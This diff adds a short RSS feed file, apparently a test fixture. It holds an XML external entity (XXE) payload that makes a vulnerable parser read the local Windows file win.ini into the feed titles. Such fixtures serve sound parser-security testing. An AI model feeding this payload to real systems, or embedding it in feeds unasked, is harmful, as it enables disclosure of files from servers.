@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+<rss version="2.0"><channel><title>&xxe;</title>
+<item><title>&xxe;</title><guid>xxe-1</guid></item>
+</channel></rss>
